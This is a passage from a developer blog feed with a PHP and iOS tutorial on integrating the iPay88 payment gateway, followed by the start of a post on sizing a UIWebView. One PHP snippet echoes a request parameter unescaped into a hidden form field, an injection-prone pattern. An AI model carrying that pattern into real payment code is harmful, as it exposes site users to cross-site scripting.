class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;RefNo&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;REF000001&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;Amount&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1.00&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;Signature&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wsE29QS6EaqI7izfDIRPv6ku/MA=&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;ProdDesc&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Buy RM1.00 credit&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;UserName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Js Lim&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;UserEmail&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;js@lim.com&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;UserContact&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0123456789&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;MerchantCode&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;M00001&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;Currency&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;MYR&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;ResponseURL&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://mysite.com/response.php&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;BackendURL&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://mysite.com/backend.php&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;frm-submit&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;, <span class="number">100</span>);</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The <strong>Signature</strong> has a formula to generate, will be provided from iPay88</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iPay88_signature</span>(<span class="params"><span class="variable">$ref_no</span>, <span class="variable">$amount</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;apple&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;M00001&#x27;</span>;</span><br><span class="line">    <span class="variable">$currency</span> = <span class="string">&#x27;MYR&#x27;</span>;</span><br><span class="line">    <span class="variable">$source</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%s%s%s%s%s&#x27;</span>, <span class="variable">$key</span>, <span class="variable">$code</span>, <span class="variable">$ref_no</span>, <span class="variable">$amount</span>, <span class="variable">$currency</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$source</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex2bin</span>(<span class="params"><span class="variable">$hexSource</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$bin</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$hexSource</span>);<span class="variable">$i</span>=<span class="variable">$i</span>+<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$bin</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$hexSource</span>,<span class="variable">$i</span>,<span class="number">2</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$bin</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A hint here, if your amount is</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;Amount&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1.00&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>then your signature source must be <em>appleM00001REF000001<strong>100</strong>MYR</em></p><p>if amount is</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;Amount&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>then your signature source must be <em>appleM00001REF000001<strong>1</strong>MYR</em></p><p>If you notice that all the inputs are hardcoded, please don’t do this<br>to your site, you can change to variable from query string. e.g.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;RefNo&quot;</span> type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$_REQUEST</span>[&#x27;ref&#x27;]; ?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>Then you access in browser: <a href="http://mysite.com/payment.php">http://mysite.com/payment.php</a></p><p>So in this case, the <strong>request URL</strong> is <a href="http://mysite.com/payment.php">http://mysite.com/payment.php</a></p><p>But wait a minute, during the development, the URL should be <strong>localhost</strong>.<br>Don’t worry, we can use virtual host here, you can refer this in <a href="/blog/2014/01/17/setup-php-environment-in-mavericks-using-xampp/">my other<br>blog post</a><br>section 3. Make sure you put the real url to <strong>/etc/hosts</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>        mysite.com</span><br></pre></td></tr></table></figure><p>So when you access <a href="http://mysite.com/">http://mysite.com</a>, you are not refering to the live site,<br>but the development site in your local machine, now you can test with<br>iPay88.</p><h4 id="This-cannot-be-done-in-cURL"><a href="#This-cannot-be-done-in-cURL" class="headerlink" title="This cannot be done in cURL"></a>This cannot be done in cURL</h4><p>I have tried using cURL as well, in fact it need to be a POST request in a webpage form.</p><h2 id="3-Create-a-response-handler"><a href="#3-Create-a-response-handler" class="headerlink" title="3. Create a response handler"></a>3. Create a response handler</h2><p><strong>response.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ErrDesc&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;failure.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Signature&#x27;</span>]) &amp;&amp; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Signature&#x27;</span>] != <span class="variable">$my_signature</span>) &#123;</span><br><span class="line">    <span class="comment">// NOTE that $my_signature you can store it in session before submit the form to iPay88</span></span><br><span class="line">    <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;failure.php&#x27;</span>); <span class="comment">// for security purpose</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// store the info returned by iPay88, you will get this in the document provided by iPay88</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// after process everything, redirect to success page</span></span><br><span class="line"><span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;success.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">redirect</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The file above will be a POST request, if you don’t want to use <code>$_REQUEST</code>, you can use <code>$_POST</code></p><h3 id="Bare-in-mind-Updated-May-12-2015"><a href="#Bare-in-mind-Updated-May-12-2015" class="headerlink" title="Bare in mind (Updated: May 12, 2015)"></a>Bare in mind <em>(Updated: May 12, 2015)</em></h3><p>Please take note on the <strong>backend.php</strong></p><p>Sometime, there are some weird issue that may caused the <strong>response.php</strong> not working correctly. Thus, <strong>backend.php</strong> is needed here <em>(I have faced the issue with CIMB click)</em>.</p><p>The <strong>backend.php</strong> will not work if you check for login session. e.g.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_loggedin</span>()) <span class="keyword">exit</span>; <span class="comment">// will exit here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// code won&#x27;t execute</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>That means you cannot deal with any session here <em>(backend.php)</em></p><h2 id="4-Create-a-success-amp-failure-page"><a href="#4-Create-a-success-amp-failure-page" class="headerlink" title="4. Create a success &amp; failure page"></a>4. Create a success &amp; failure page</h2><p><strong>success.php</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;window.location.href=&#x27;com.mysite.myapp://successClicked&#x27;;&quot;</span>&gt;</span>Done<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>failure.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button type=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;window.location.href=&#x27;com.mysite.myapp://closeClicked&#x27;;&quot;</span>&gt;Close&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>See <strong>com.mysite.myapp</strong>? Is this weird to you? If you have use <a href="https://www.waze.com/about/dev">Waze API</a><br>you will see <code>waze://?q=&lt;address search term&gt;</code> this, <code>waze://</code> is the custom scheme that only<br>use in Waze app. Same to this, <code>com.mysite.myapp://</code> is only use in this app</p><h2 id="5-Show-the-page-above-in-your-app-using-UIWebView"><a href="#5-Show-the-page-above-in-your-app-using-UIWebView" class="headerlink" title="5. Show the page above in your app using UIWebView"></a>5. Show the page above in your app using <code>UIWebView</code></h2><p>Create a custom web view to handle payment</p><p><strong>PaymentWebViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;PaymentWebViewController.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">PaymentWebViewController</span> ()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">weak</span>) <span class="built_in">UIWebView</span> *webView;</span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">UIWebView</span> *popupWebView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">PaymentWebViewController</span></span></span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)viewDidLoad &#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewDidLoad];</span><br><span class="line">    <span class="comment">// add in a refresh button</span></span><br><span class="line">    <span class="keyword">self</span>.navigationItem.rightBarButtonItem = [[<span class="built_in">UIBarButtonItem</span> alloc] initWithBarButtonSystemItem:<span class="built_in">UIBarButtonSystemItemRefresh</span> target:<span class="keyword">self</span> action:<span class="keyword">@selector</span>(refreshButtonTapped:)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">UIWebView</span> *webView = [[<span class="built_in">UIWebView</span> alloc] initWithFrame:<span class="keyword">self</span>.view.bounds];</span><br><span class="line">    webView.autoresizingMask = <span class="built_in">UIViewAutoresizingFlexibleBottomMargin</span> | <span class="built_in">UIViewAutoresizingFlexibleHeight</span> | <span class="built_in">UIViewAutoresizingFlexibleTopMargin</span>;</span><br><span class="line">    webView.delegate = <span class="keyword">self</span>;</span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:webView];</span><br><span class="line">    _webView = webView;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="built_in">NSDictionary</span> *params = @&#123;</span><br><span class="line">                             <span class="string">@&quot;ref&quot;</span>: <span class="string">@&quot;REF000001&quot;</span></span><br><span class="line">                             , <span class="string">@&quot;amount&quot;</span>: <span class="string">@&quot;1.00&quot;</span></span><br><span class="line">                             <span class="comment">// ...</span></span><br><span class="line">                             &#125;</span><br><span class="line">    <span class="built_in">NSURLRequest</span> *request = [[<span class="built_in">NSURLRequest</span> alloc] initWithURL:[<span class="built_in">NSURL</span> URLWithString:[<span class="built_in">NSString</span> stringWithFormat:<span class="string">@&quot;http://mysite.com/payment.php?%@&quot;</span>, [<span class="keyword">self</span> httpBuildQuery:params]]]];</span><br><span class="line">    [_webView loadRequest:request];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)didReceiveMemoryWarning &#123;</span><br><span class="line">    [<span class="variable language_">super</span> didReceiveMemoryWarning];</span><br><span class="line">    <span class="comment">// Dispose of any resources that can be recreated.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- (<span class="built_in">NSString</span> *)httpBuildQuery:(<span class="built_in">NSDictionary</span> *)params</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSMutableArray</span> *parts = [<span class="built_in">NSMutableArray</span> array];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">id</span> key <span class="keyword">in</span> params) &#123;</span><br><span class="line">        <span class="type">id</span> value = params[key];</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">NSString</span> *keyString = [<span class="built_in">NSString</span> stringWithFormat:<span class="string">@&quot;%@&quot;</span>, key];</span><br><span class="line">        <span class="built_in">NSString</span> *valueString = [<span class="built_in">NSString</span> stringWithFormat:<span class="string">@&quot;%@&quot;</span>, value];</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">NSString</span> *part = [<span class="built_in">NSString</span> stringWithFormat: <span class="string">@&quot;%@=%@&quot;</span>, [keyString stringByAddingPercentEscapesUsingEncoding:<span class="built_in">NSUTF8StringEncoding</span>], [valueString stringByAddingPercentEscapesUsingEncoding:<span class="built_in">NSUTF8StringEncoding</span>]];</span><br><span class="line">        [parts addObject: part];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [parts componentsJoinedByString: <span class="string">@&quot;&amp;&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)refreshButtonTapped:(<span class="type">id</span>)sender</span><br><span class="line">&#123;</span><br><span class="line">    [_webView reload];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">BOOL</span>)webView:(<span class="built_in">UIWebView</span> *)webView shouldStartLoadWithRequest:(<span class="built_in">NSURLRequest</span> *)request navigationType:(<span class="built_in">UIWebViewNavigationType</span>)navigationType</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Update: May 12, 2015</span></span><br><span class="line">    <span class="comment">// a hack to solve the Maybank2u TAC popup window issue</span></span><br><span class="line">    <span class="keyword">if</span> ([request.URL.path containsString:<span class="string">@&quot;m2uTACProcess.do&quot;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// init a new webview (as a popup)</span></span><br><span class="line">        _popupWebView = [[<span class="built_in">UIWebView</span> alloc] initWithFrame:<span class="built_in">CGRectMake</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">280</span>, <span class="number">400</span>)];</span><br><span class="line">        [_popupWebView loadRequest:request];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// show it in a popup, I tested with https://github.com/rnystrom/RNBlurModalView</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NO</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ([[request.URL scheme] isEqual:<span class="string">@&quot;com.mysite.myapp&quot;</span>]) &#123;</span><br><span class="line">        <span class="built_in">NSArray</span> *component = [request.URL.description componentsSeparatedByString:<span class="string">@&quot;://&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span> ([component[<span class="number">1</span>] isEqual:<span class="string">@&quot;closeClicked&quot;</span>]) &#123; <span class="comment">// com.mysite.myapp://closeClicked</span></span><br><span class="line">            <span class="comment">// action to perform after payment failed</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ([component[<span class="number">1</span>] isEqual:<span class="string">@&quot;successClicked&quot;</span>]) &#123; <span class="comment">// com.mysite.myapp://successClicked</span></span><br><span class="line">            <span class="comment">// action to perform after success</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NO</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">YES</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p>See <strong>com.mysite.myapp</strong> again? We detect if the URL scheme is <code>com.mysite.myapp</code>, then<br>perform some action.</p><p>When the time your app open this web view, you will see iPay88 page. The whole integration is done.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;The first payment gateway I dealed with was PayPal. At that moment,&lt;br&gt;I found it sucks, very tedious to integrate into iOS</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
    <category term="swift" scheme="http://jslim.net/tags/swift/"/>
    
    <category term="payment-gateway" scheme="http://jslim.net/tags/payment-gateway/"/>
    
  </entry>
  
  <entry>
    <title>Show html description in UIWebView in a better way</title>
    <link href="http://jslim.net/blog/2015/03/27/show-html-description-in-uiwebview-in-a-better-way/"/>
    <id>http://jslim.net/blog/2015/03/27/show-html-description-in-uiwebview-in-a-better-way/</id>
    <published>2015-03-27T20:28:50.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/posts/2015-03-28-show-html-description-in-uiwebview-in-a-better-way/end-result.gif" alt="Desire result"></p><p>Let’s take a look on the output above, the <strong>Event Description</strong> content.<br>Yes, it can achieved by using <code>UILabel</code>, but somehow HTML would be easy<br>to construct the format. Thus I’m showing a demo on how to use <code>UIWebView</code><br>to achieve this.</p><p><strong>This is using auto-layout</strong></p><h2 id="Add-constraint"><a href="#Add-constraint" class="headerlink" title="Add constraint"></a>Add constraint</h2><p><em>(I assumed that you know how to add constraint through storyboard)</em></p><p><img src="/images/posts/2015-03-28-show-html-description-in-uiwebview-in-a-better-way/add-constraint.png" alt="Add constraint to UIWebView"></p><p>Now add 4 or 5 constraints to <code>UIWebView</code>, make sure the <em>Height</em> constraint is added, you can put any value you like.</p><h2 id="Set-UIWebViewDelegate-to-self"><a href="#Set-UIWebViewDelegate-to-self" class="headerlink" title="Set UIWebViewDelegate to self"></a>Set <code>UIWebViewDelegate</code> to self</h2><p><strong>ViewController.swift</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ViewController</span>: <span class="title class_">UIViewController</span>, <span class="title class_">UIWebViewDelegate</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Go back the storyboard, hold the right-click and drag it over to the controller</p><p><img src="/images/posts/2015-03-28-show-html-description-in-uiwebview-in-a-better-way/delegate.png" alt="drag to delegate"></p><h2 id="Disable-scroll-format-subview"><a href="#Disable-scroll-format-subview" class="headerlink" title="Disable scroll, format subview"></a>Disable scroll, format subview</h2><p>Here to disable the scroll, hide the scroll indicator, disable bounces,<br>clear the <code>UIWebView</code> background</p><p><strong>ViewController.swift</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">self</span>.descriptionWebView.scrollView.scrollEnabled <span class="operator">=</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">self</span>.descriptionWebView.scrollView.bounces <span class="operator">=</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">self</span>.descriptionWebView.scrollView.showsHorizontalScrollIndicator <span class="operator">=</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">self</span>.descriptionWebView.scrollView.showsVerticalScrollIndicator <span class="operator">=</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">for</span> subview <span class="keyword">in</span> <span class="keyword">self</span>.descriptionWebView.subviews &#123;</span><br><span class="line">    <span class="keyword">if</span> subview.isKindOfClass(<span class="type">UIScrollView</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> shadowView <span class="keyword">in</span> subview.subviews &#123;</span><br><span class="line">            <span class="keyword">if</span> shadowView.isKindOfClass(<span class="type">UIImageView</span>) &#123;</span><br><span class="line">                (shadowView <span class="keyword">as</span> <span class="type">UIView</span>).hidden <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Add-content-amp-update-height"><a href="#Add-content-amp-update-height" class="headerlink" title="Add content &amp; update height"></a>Add content &amp; update height</h2><p>Add a wrapper to the content <em>(use <code>main-wrapper</code> here)</em></p><p><strong>ViewController.swift</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">self</span>.descriptionWebView.loadHTMLString(<span class="string">&quot;&lt;div id=&#x27;main-wrapper&#x27;&gt;<span class="subst">\(html)</span>&lt;/div&gt;&quot;</span>, baseURL: <span class="literal">nil</span>)</span><br></pre></td></tr></table></figure><p>Implement the <code>UIWebViewDelegate</code></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">func</span> <span class="title function_">webViewDidFinishLoad</span>(<span class="params">webView</span>: <span class="type">UIWebView</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> output <span class="operator">=</span> webView.stringByEvaluatingJavaScriptFromString(<span class="string">&quot;document.getElementById(<span class="subst">\&quot;</span>main-wrapper<span class="subst">\&quot;</span>).offsetHeight;&quot;</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> height <span class="operator">=</span> output.toDouble() &#123;</span><br><span class="line">            println(<span class="string">&quot;webView content height <span class="subst">\(height)</span>&quot;</span>)</span><br><span class="line">            println(<span class="string">&quot;webview constraint before <span class="subst">\(webView.constraints())</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> heightConstraint <span class="operator">=</span> webView.constraints()[<span class="number">0</span>] <span class="keyword">as</span> <span class="type">NSLayoutConstraint</span></span><br><span class="line">            <span class="comment">// here is to update the height of UIWebView</span></span><br><span class="line">            heightConstraint.constant <span class="operator">=</span> <span class="type">CGFloat</span>(height)</span><br><span class="line">            </span><br><span class="line">            println(<span class="string">&quot;webview constraint after <span class="subst">\(webView.constraints())</span>&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The output would be</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span 